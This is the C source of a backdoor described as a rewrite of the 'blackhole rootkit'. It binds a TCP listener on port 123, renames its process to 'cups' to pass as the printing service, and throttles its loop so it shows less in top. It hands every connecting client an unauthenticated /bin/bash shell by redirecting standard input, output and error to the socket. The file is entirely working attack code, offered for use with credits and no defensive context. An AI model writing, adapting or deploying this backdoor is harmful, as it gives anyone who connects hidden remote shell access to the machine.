// ReWrite of the famous blackhole rootkit
// this one imatates cups and is only "stable"
// when run as root
// Otherwise you are liable to get a random port

#include <stdio.h>
#include <errno.h>
#include <signal.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <strings.h>
#include <unistd.h>

#define HIDE "cups"
#define SH "/bin/bash"
#define LISTN 5

int main(int argc, char **argv)
{

/* welcome mesg */
char *con 	= "\nConnected!\n\n";
char *credit 	= "This fine tool coded by Bronc Buster\n";
char *credit2 	= "and refined by nullbytes\n";
char *instr	= "Command delimited by ';'\n";
char *credit22	= "FOR TEMPORARY USE ONLY\n";
int outsock, insock, sz; 

/* change this is a int now so it can self fix bind issue */

int P = 123; // for the love of anything holy change this

/* set up two structs for in and out */
struct sockaddr_in home;
struct sockaddr_in away;
/* set port, proto and bzero for BIND */
home.sin_family=AF_INET;
home.sin_port=htons(P);
home.sin_addr.s_addr=INADDR_ANY;
bzero(&(home.sin_zero),8);

/* changing the name that will appear */
strcpy(argv[0],HIDE);

/* catch the SIG */
signal(SIGCHLD,SIG_IGN);

/* here we go! */
if((outsock=socket(AF_INET,SOCK_STREAM,0))<0)
	exit(printf("Socket error\n"));

/* this loop tries the next port if bind fails */
int i = 1;
for (i = 1; i < 4; i++)	{ 
	if((bind(outsock,(struct sockaddr *)&home,sizeof(home))<0))
	{
		printf("Bind error is the port in use?\n");
		printf("port %i didn't work trying %i\n", P, P+i); 
		home.sin_port=htons(P+i);                        	
	}
	else	
	{
		printf("were good,  we're at port %i", P);
		break;
	}

}
if((listen(outsock,LISTN))<0)
  exit(printf("Listen error: I have no idea what went wrong\n"));

sz=sizeof(struct sockaddr_in);

/* infinate loop - wait for accept*/
for(;;)
  {
  /* this sleep limits the infinite for loop so it doesn't 
   * show so high on the command top*/
  sleep(5);
 
  if((insock=accept(outsock,(struct sockaddr *)&away, &sz))<0)
    exit(printf("Accept error"));
  if(fork() !=0)
    {
    send(insock,con,strlen(con),0); /* send out welcome mesg */
    send(insock,credit,strlen(credit),0);
    send(insock,credit2,strlen(credit2),0);
    send(insock,instr,strlen(instr),0);
    send(insock,credit22,strlen(credit22),0);
    dup2(insock,0); /* open stdin  */
    dup2(insock,1); /* open stdout */
    dup2(insock,2); /* open stderr */
    execl(SH,SH,(char *)0); /* start our shell */
    close(insock);
    exit(0); /* all done, leave and close sock */
    }
  close(insock);
  }
}

/* EOF */

